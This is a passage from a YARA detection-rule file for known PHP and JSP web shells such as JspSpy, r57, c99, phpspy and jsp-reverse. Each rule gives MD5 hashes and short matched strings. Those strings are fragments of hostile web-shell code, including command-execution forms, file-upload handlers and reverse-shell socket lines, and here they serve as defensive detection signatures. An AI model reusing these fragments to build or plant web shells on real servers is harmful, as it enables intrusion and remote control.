		$s3 = "entrika.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreate"
	condition:
		all of them
}
rule webshell_config_myxx_zend {
	meta:
		description = "Web Shell - from files config.jsp, myxx.jsp, zend.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "d44df8b1543b837e57cc8f25a0a68d92"
		hash1 = "e0354099bee243702eb11df8d0e046df"
		hash2 = "591ca89a25f06cf01e4345f98a22845c"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s3 = ".println(\"<a href=\\\"javascript:alert('You Are In File Now ! Can Not Pack !');"
	condition:
		all of them
}
rule webshell_browser_201_3_ma_download {
	meta:
		description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, download.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "37603e44ee6dc1c359feb68a0d566f76"
		hash1 = "a7e25b8ac605753ed0c438db93f6c498"
		hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash4 = "fa87bbd7201021c1aefee6fcc5b8e25a"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s2 = "<small>jsp File Browser version <%= VERSION_NR%> by <a"
		$s3 = "else if (fName.endsWith(\".mpg\") || fName.endsWith(\".mpeg\") || fName.endsWith"
	condition:
		all of them
}
rule webshell_itsec_itsecteam_shell_jHn {
	meta:
		description = "Web Shell - from files itsec.php, itsecteam_shell.php, jHn.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "8ae9d2b50dc382f0571cd7492f079836"
		hash1 = "bd6d3b2763c705a01cc2b3f105a25fa4"
		hash2 = "40c6ecf77253e805ace85f119fe1cebb"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s4 = "echo $head.\"<font face='Tahoma' size='2'>Operating System : \".php_uname().\"<b"
		$s5 = "echo \"<center><form name=client method='POST' action='$_SERVER[PHP_SELF]?do=db'"
	condition:
		all of them
}
rule webshell_ghost_source_icesword_silic {
	meta:
		description = "Web Shell - from files ghost_source.php, icesword.php, silic.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "cbf64a56306c1b5d98898468fc1fdbd8"
		hash1 = "6e20b41c040efb453d57780025a292ae"
		hash2 = "437d30c94f8eef92dc2f064de4998695"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s3 = "if(eregi('WHERE|LIMIT',$_POST['nsql']) && eregi('SELECT|FROM',$_POST['nsql'])) $"
		$s6 = "if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST["
	condition:
		all of them
}
rule webshell_JspSpy_JspSpyJDK5_JspSpyJDK51_luci_jsp_spy2009_m_ma3_xxx {
	meta:
		description = "Web Shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash4 = "8b457934da3821ba58b06a113e0d53d9"
		hash5 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash6 = "14e9688c86b454ed48171a9d4f48ace8"
		hash7 = "b330a6c2d49124ef0729539761d6ef0b"
		hash8 = "d71716df5042880ef84427acee8b121e"
		hash9 = "341298482cf90febebb8616426080d1d"
		hash10 = "29aebe333d6332f0ebc2258def94d57e"
		hash11 = "42654af68e5d4ea217e6ece5389eb302"
		hash12 = "88fc87e7c58249a398efd5ceae636073"
		hash13 = "4a812678308475c64132a9b56254edbc"
		hash14 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash15 = "344f9073576a066142b2023629539ebd"
		hash16 = "32dea47d9c13f9000c4c807561341bee"
		hash17 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash18 = "655722eaa6c646437c8ae93daac46ae0"
		hash19 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash20 = "9c94637f76e68487fa33f7b0030dd932"
		hash21 = "6acc82544be056580c3a1caaa4999956"
		hash22 = "6aa32a6392840e161a018f3907a86968"
		hash23 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash24 = "3ea688e3439a1f56b16694667938316d"
		hash25 = "ab77e4d1006259d7cbc15884416ca88c"
		hash26 = "71097537a91fac6b01f46f66ee2d7749"
		hash27 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash28 = "7a4b090619ecce6f7bd838fe5c58554b"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s8 = "\"<form action=\\\"\"+SHELL_NAME+\"?o=upload\\\" method=\\\"POST\\\" enctype="
		$s9 = "<option value='reg query \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\T"
	condition:
		all of them
}
rule webshell_2_520_job_ma1_ma4_2 {
	meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "56c005690da2558690c4aa305a31ad37"
		hash3 = "532b93e02cddfbb548ce5938fe2f5559"
		hash4 = "6e0fa491d620d4af4b67bae9162844ae"
		hash5 = "7eabe0f60975c0c73d625b7ddf7b9cbd"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s4 = "_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" "
		$s9 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getR"
	condition:
		all of them
}
rule webshell_000_403_807_a_c5_config_css_dm_he1p_JspSpy_JspSpyJDK5_JspSpyJDK51_luci_jsp_xxx {
	meta:
		description = "Web Shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash4 = "8b457934da3821ba58b06a113e0d53d9"
		hash5 = "d44df8b1543b837e57cc8f25a0a68d92"
		hash6 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash7 = "14e9688c86b454ed48171a9d4f48ace8"
		hash8 = "b330a6c2d49124ef0729539761d6ef0b"
		hash9 = "d71716df5042880ef84427acee8b121e"
		hash10 = "341298482cf90febebb8616426080d1d"
		hash11 = "29aebe333d6332f0ebc2258def94d57e"
		hash12 = "42654af68e5d4ea217e6ece5389eb302"
		hash13 = "88fc87e7c58249a398efd5ceae636073"
		hash14 = "4a812678308475c64132a9b56254edbc"
		hash15 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash16 = "e0354099bee243702eb11df8d0e046df"
		hash17 = "344f9073576a066142b2023629539ebd"
		hash18 = "32dea47d9c13f9000c4c807561341bee"
		hash19 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash20 = "655722eaa6c646437c8ae93daac46ae0"
		hash21 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash22 = "9c94637f76e68487fa33f7b0030dd932"
		hash23 = "6acc82544be056580c3a1caaa4999956"
		hash24 = "6aa32a6392840e161a018f3907a86968"
		hash25 = "591ca89a25f06cf01e4345f98a22845c"
		hash26 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash27 = "3ea688e3439a1f56b16694667938316d"
		hash28 = "ab77e4d1006259d7cbc15884416ca88c"
		hash29 = "71097537a91fac6b01f46f66ee2d7749"
		hash30 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash31 = "7a4b090619ecce6f7bd838fe5c58554b"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "ports = \"21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500\";" fullword
		$s1 = "private static class VEditPropertyInvoker extends DefaultInvoker {" fullword
	condition:
		all of them
}
rule webshell_wso2_5_1_wso2_5_wso2 {
	meta:
		description = "Web Shell - from files wso2.5.1.php, wso2.5.php, wso2.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "dbeecd555a2ef80615f0894027ad75dc"
		hash1 = "7c8e5d31aad28eb1f0a9a53145551e05"
		hash2 = "cbc44fb78220958f81b739b493024688"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s7 = "$opt_charsets .= '<option value=\"'.$item.'\" '.($_POST['charset']==$item?'selec"
		$s8 = ".'</td><td><a href=\"#\" onclick=\"g(\\'FilesTools\\',null,\\''.urlencode($f['na"
	condition:
		all of them
}
rule webshell_000_403_c5_queryDong_spyjsp2010_t00ls {
	meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp, t00ls.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "8b457934da3821ba58b06a113e0d53d9"
		hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash4 = "655722eaa6c646437c8ae93daac46ae0"
		hash5 = "9c94637f76e68487fa33f7b0030dd932"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s8 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')"
		$s9 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\""
	condition:
		all of them
}
rule webshell_404_data_suiyue {
	meta:
		description = "Web Shell - from files 404.jsp, data.jsp, suiyue.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "7066f4469c3ec20f4890535b5f299122"
		hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
		hash2 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s3 = " sbCopy.append(\"<input type=button name=goback value=' \"+strBack[languageNo]+"
	condition:
		all of them
}
rule webshell_r57shell_r57shell127_SnIpEr_SA_Shell_EgY_SpIdEr_ShElL_V2_r57_xxx {
	meta:
		description = "Web Shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ef43fef943e9df90ddb6257950b3538f"
		hash1 = "ae025c886fbe7f9ed159f49593674832"
		hash2 = "911195a9b7c010f61b66439d9048f400"
		hash3 = "697dae78c040150daff7db751fc0c03c"
		hash4 = "513b7be8bd0595c377283a7c87b44b2e"
		hash5 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash6 = "e5b2131dd1db0dbdb43b53c5ce99016a"
		hash7 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash8 = "41af6fd253648885c7ad2ed524e0692d"
		hash9 = "6fcc283470465eed4870bcc3e2d7f14d"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s2 = "echo sr(15,\"<b>\".$lang[$language.'_text58'].$arrow.\"</b>\",in('text','mk_name"
		$s3 = "echo sr(15,\"<b>\".$lang[$language.'_text21'].$arrow.\"</b>\",in('checkbox','nf1"
		$s9 = "echo sr(40,\"<b>\".$lang[$language.'_text26'].$arrow.\"</b>\",\"<select size="
	condition:
		all of them
}
rule webshell_807_a_css_dm_he1p_JspSpy_xxx {
	meta:
		description = "Web Shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash1 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash2 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash3 = "14e9688c86b454ed48171a9d4f48ace8"
		hash4 = "b330a6c2d49124ef0729539761d6ef0b"
		hash5 = "d71716df5042880ef84427acee8b121e"
		hash6 = "341298482cf90febebb8616426080d1d"
		hash7 = "29aebe333d6332f0ebc2258def94d57e"
		hash8 = "42654af68e5d4ea217e6ece5389eb302"
		hash9 = "88fc87e7c58249a398efd5ceae636073"
		hash10 = "4a812678308475c64132a9b56254edbc"
		hash11 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash12 = "344f9073576a066142b2023629539ebd"
		hash13 = "32dea47d9c13f9000c4c807561341bee"
		hash14 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash15 = "6acc82544be056580c3a1caaa4999956"
		hash16 = "6aa32a6392840e161a018f3907a86968"
		hash17 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash18 = "3ea688e3439a1f56b16694667938316d"
		hash19 = "ab77e4d1006259d7cbc15884416ca88c"
		hash20 = "71097537a91fac6b01f46f66ee2d7749"
		hash21 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash22 = "7a4b090619ecce6f7bd838fe5c58554b"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "\"<h2>Remote Control &raquo;</h2><input class=\\\"bt\\\" onclick=\\\"var"
		$s2 = "\"<p>Current File (import new file name and new file)<br /><input class=\\\"inpu"
		$s3 = "\"<p>Current file (fullpath)<br /><input class=\\\"input\\\" name=\\\"file\\\" i"
	condition:
		all of them
}
rule webshell_201_3_ma_download {
	meta:
		description = "Web Shell - from files 201.jsp, 3.jsp, ma.jsp, download.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "a7e25b8ac605753ed0c438db93f6c498"
		hash1 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash2 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash3 = "fa87bbd7201021c1aefee6fcc5b8e25a"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<input title=\"Upload selected file to the current working directory\" type=\"Su"
		$s5 = "<input title=\"Launch command in current directory\" type=\"Submit\" class=\"but"
		$s6 = "<input title=\"Delete all selected files and directories incl. subdirs\" class="
	condition:
		all of them
}
rule webshell_browser_201_3_400_in_JFolder_jfolder01_jsp_leo_ma_warn_webshell_nc_download {
	meta:
		description = "Web Shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "37603e44ee6dc1c359feb68a0d566f76"
		hash1 = "a7e25b8ac605753ed0c438db93f6c498"
		hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash3 = "36331f2c81bad763528d0ae00edf55be"
		hash4 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash5 = "8979594423b68489024447474d113894"
		hash6 = "ec482fc969d182e5440521c913bab9bd"
		hash7 = "f98d2b33cd777e160d1489afed96de39"
		hash8 = "4b4c12b3002fad88ca6346a873855209"
		hash9 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash10 = "e9a5280f77537e23da2545306f6a19ad"
		hash11 = "598eef7544935cf2139d1eada4375bb5"
		hash12 = "fa87bbd7201021c1aefee6fcc5b8e25a"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s4 = "UplInfo info = UploadMonitor.getInfo(fi.clientFileName);" fullword
		$s5 = "long time = (System.currentTimeMillis() - starttime) / 1000l;" fullword
	condition:
		all of them
}
rule webshell_shell_phpspy_2006_arabicspy {
	meta:
		description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "40a1f840111996ff7200d18968e42cfe"
		hash2 = "e0202adff532b28ef1ba206cf95962f2"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype"
		$s8 = "echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"P"
	condition:
		all of them
}
rule webshell_in_JFolder_jfolder01_jsp_leo_warn {
	meta:
		description = "Web Shell - from files in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash1 = "8979594423b68489024447474d113894"
		hash2 = "ec482fc969d182e5440521c913bab9bd"
		hash3 = "f98d2b33cd777e160d1489afed96de39"
		hash4 = "4b4c12b3002fad88ca6346a873855209"
		hash5 = "e9a5280f77537e23da2545306f6a19ad"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s4 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strD"
		$s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDi"
	condition:
		all of them
}
rule webshell_2_520_icesword_job_ma1_ma4_2 {
	meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "077f4b1b6d705d223b6d644a4f3eebae"
		hash3 = "56c005690da2558690c4aa305a31ad37"
		hash4 = "532b93e02cddfbb548ce5938fe2f5559"
		hash5 = "6e0fa491d620d4af4b67bae9162844ae"
		hash6 = "7eabe0f60975c0c73d625b7ddf7b9cbd"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s2 = "private String[] _textFileTypes = {\"txt\", \"htm\", \"html\", \"asp\", \"jsp\","
		$s3 = "\\\" name=\\\"upFile\\\" size=\\\"8\\\" class=\\\"textbox\\\" />&nbsp;<input typ"
		$s9 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"passwor"
	condition:
		all of them
}
rule webshell_phpspy_2005_full_phpspy_2005_lite_PHPSPY {
	meta:
		description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, PHPSPY.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash1 = "42f211cec8032eb0881e87ebdb3d7224"
		hash2 = "0712e3dc262b4e1f98ed25760b206836"
		id = "41a0560a-b22e-5028-8ad1-710c5758cb1d"
	strings:
		$s6 = "<input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['comma"
		$s7 = "echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILE"
		$s8 = "<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; "
	condition:
		2 of them
}
rule webshell_shell_phpspy_2006_arabicspy_hkrkoz {
	meta:
		description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "40a1f840111996ff7200d18968e42cfe"
		hash2 = "e0202adff532b28ef1ba206cf95962f2"
		hash3 = "802f5cae46d394b297482fd0c27cb2fc"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s5 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
	condition:
		all of them
}
rule webshell_c99_Shell_ci_Biz_was_here_c100_v_xxx {
	meta:
		description = "Web Shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
		hash1 = "f2fa878de03732fbf5c86d656467ff50"
		hash2 = "27786d1e0b1046a1a7f67ee41c64bf4c"
		hash3 = "0f5b9238d281bc6ac13406bb24ac2a5b"
		hash4 = "68c0629d08b1664f5bcce7d7f5f71d22"
		hash5 = "048ccc01b873b40d57ce25a4c56ea717"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s8 = "else {echo \"Running datapipe... ok! Connect to <b>\".getenv(\"SERVER_ADDR\""
	condition:
		all of them
}
rule webshell_2008_2009lite_2009mssql {
	meta:
		description = "Web Shell - from files 2008.php, 2009lite.php, 2009mssql.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "3e4ba470d4c38765e4b16ed930facf2c"
		hash1 = "3f4d454d27ecc0013e783ed921eeecde"
		hash2 = "aa17b71bb93c6789911bd1c9df834ff9"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<a href=\"javascript:godir(\\''.$drive->Path.'/\\');"
		$s7 = "p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all"
	condition:
		all of them
}
rule webshell_shell_phpspy_2005_full_phpspy_2005_lite_phpspy_2006_arabicspy_PHPSPY_hkrkoz {
	meta:
		description = "Web Shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash2 = "42f211cec8032eb0881e87ebdb3d7224"
		hash3 = "40a1f840111996ff7200d18968e42cfe"
		hash4 = "e0202adff532b28ef1ba206cf95962f2"
		hash5 = "0712e3dc262b4e1f98ed25760b206836"
		hash6 = "802f5cae46d394b297482fd0c27cb2fc"
		id = "41a0560a-b22e-5028-8ad1-710c5758cb1d"
	strings:
		$s0 = "$mainpath_info           = explode('/', $mainpath);" fullword
		$s6 = "if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \"d"
	condition:
		all of them
}
rule webshell_807_dm_JspSpyJDK5_m_cofigrue {
	meta:
		description = "Web Shell - from files 807.jsp, dm.jsp, JspSpyJDK5.jsp, m.jsp, cofigrue.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash1 = "14e9688c86b454ed48171a9d4f48ace8"
		hash2 = "341298482cf90febebb8616426080d1d"
		hash3 = "88fc87e7c58249a398efd5ceae636073"
		hash4 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "url_con.setRequestProperty(\"REFERER\", \"\"+fckal+\"\");" fullword
		$s9 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword
	condition:
		1 of them
}
rule webshell_Dive_Shell_1_0_Emperor_Hacking_Team_xxx {
	meta:
		description = "Web Shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "1b5102bdc41a7bc439eea8f0010310a5"
		hash1 = "f8a6d5306fb37414c5c772315a27832f"
		hash2 = "37cb1db26b1b0161a4bf678a6b4565bd"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== fals"
		$s9 = "if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {" fullword
	condition:
		all of them
}
rule webshell_404_data_in_JFolder_jfolder01_xxx {
	meta:
		description = "Web Shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "7066f4469c3ec20f4890535b5f299122"
		hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
		hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash3 = "8979594423b68489024447474d113894"
		hash4 = "ec482fc969d182e5440521c913bab9bd"
		hash5 = "f98d2b33cd777e160d1489afed96de39"
		hash6 = "4b4c12b3002fad88ca6346a873855209"
		hash7 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
		hash8 = "e9a5280f77537e23da2545306f6a19ad"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s4 = "&nbsp;<TEXTAREA NAME=\"cqq\" ROWS=\"20\" COLS=\"100%\"><%=sbCmd.toString()%></TE"
	condition:
		all of them
}
rule webshell_jsp_reverse_jsp_reverse_jspbd {
	meta:
		description = "Web Shell - from files jsp-reverse.jsp, jsp-reverse.jsp, jspbd.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		super_rule = 1
		hash0 = "8b0e6779f25a17f0ffb3df14122ba594"
		hash1 = "ea87f0c1f0535610becadf5a98aca2fc"
		hash2 = "7d5e9732766cf5b8edca9b7ae2b6028f"
		score = 50
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "osw = new BufferedWriter(new OutputStreamWriter(os));" fullword
		$s7 = "sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());" fullword
		$s9 = "isr = new BufferedReader(new InputStreamReader(is));" fullword
	condition:
		all of them
}
rule webshell_400_in_JFolder_jfolder01_jsp_leo_warn_webshell_nc {
	meta:
		description = "Web Shell - from files 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp, webshell-nc.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "36331f2c81bad763528d0ae00edf55be"
		hash1 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash2 = "8979594423b68489024447474d113894"
		hash3 = "ec482fc969d182e5440521c913bab9bd"
		hash4 = "f98d2b33cd777e160d1489afed96de39"
		hash5 = "4b4c12b3002fad88ca6346a873855209"
		hash6 = "e9a5280f77537e23da2545306f6a19ad"
		hash7 = "598eef7544935cf2139d1eada4375bb5"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "sbFolder.append(\"<tr><td >&nbsp;</td><td>\");" fullword
		$s1 = "return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;" fullword
		$s5 = "FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");" fullword
		$s6 = "<input type=\"hidden\" name=\"cmd\" value=\"<%=strCmd%>\">" fullword
	condition:
		2 of them
}
rule webshell_2_520_job_JspWebshell_1_2_ma1_ma4_2 {
	meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, job.jsp, JspWebshell 1.2.jsp, ma1.jsp, ma4.jsp, 2.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
